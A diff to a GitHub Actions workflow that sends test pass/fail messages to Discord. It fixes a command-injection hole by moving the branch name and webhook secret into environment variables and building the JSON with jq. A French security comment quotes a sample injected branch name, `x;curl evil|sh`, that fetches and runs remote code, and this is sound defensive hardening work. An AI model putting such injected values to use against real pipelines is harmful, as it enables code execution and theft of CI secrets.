@@ -7,12 +7,21 @@ on:
     types:
       - completed
 
+# Le workflow ne lit ni n'écrit rien dans le dépôt : il ne fait qu'appeler un webhook Discord.
+permissions: {}
+
 jobs:
   notify_failure:
     runs-on: ubuntu-latest
     if: ${{ github.event.workflow_run.conclusion == 'failure' }}
     steps:
       - name: Send message to Discord
+        # SÉCURITÉ: le nom de branche est choisi par celui qui pousse. Interpolé dans le script par
+        # ${{ }}, un nom comme `x;curl evil|sh` s'exécuterait dans un job qui détient DISCORD_LOG
+        # (injection de commande). Passé par l'environnement, il reste une simple donnée.
+        env:
+          BRANCH_NAME: ${{ github.event.workflow_run.head_branch }}
+          DISCORD_LOG: ${{ secrets.DISCORD_LOG }}
         run: |
           URLS=(
             "https://media1.tenor.com/m/4CtiBiTdmioAAAAC/vilebrequin-sylvain.gif"
@@ -27,16 +36,18 @@ jobs:
             "https://media1.tenor.com/m/1c70Jy7WZI8AAAAd/cat.gif"
           )
           RANDOM_URL=${URLS[$RANDOM % ${#URLS[@]}]}
-          BRANCH_NAME=${{ github.event.workflow_run.head_branch }}
-          curl -X POST -H "Content-Type: application/json" \
-          -d "{\"content\": \"Tests failed on branch $BRANCH_NAME! $RANDOM_URL\"}" \
-          ${{ secrets.DISCORD_LOG }}
+          # jq construit le JSON : un nom de branche contenant des guillemets ne casse pas la charge utile.
+          jq -n --arg b "$BRANCH_NAME" --arg u "$RANDOM_URL" '{content: ("Tests failed on branch " + $b + "! " + $u)}' \
+            | curl -X POST -H "Content-Type: application/json" -d @- "$DISCORD_LOG"
 
   notify_success:
     runs-on: ubuntu-latest
     if: ${{ github.event.workflow_run.conclusion == 'success' }}
     steps:
       - name: Send success message to Discord
+        env:
+          BRANCH_NAME: ${{ github.event.workflow_run.head_branch }}
+          DISCORD_LOG: ${{ secrets.DISCORD_LOG }}
         run: |
           URLS=(
             "https://media1.tenor.com/m/BhPivX5RaGgAAAAd/vilebrequin-vilbrequin.gif"
@@ -47,7 +58,5 @@ jobs:
             "https://media1.tenor.com/m/wjS2sXen8iMAAAAd/stonks-up-stongs.gif"
           )
           RANDOM_URL=${URLS[$RANDOM % ${#URLS[@]}]}
-          BRANCH_NAME=${{ github.event.workflow_run.head_branch }}
-          curl -X POST -H "Content-Type: application/json" \
-          -d "{\"content\": \"Tests succeeded on branch $BRANCH_NAME! $RANDOM_URL\"}" \
-          ${{ secrets.DISCORD_LOG }}
+          jq -n --arg b "$BRANCH_NAME" --arg u "$RANDOM_URL" '{content: ("Tests succeeded on branch " + $b + "! " + $u)}' \
+            | curl -X POST -H "Content-Type: application/json" -d @- "$DISCORD_LOG"
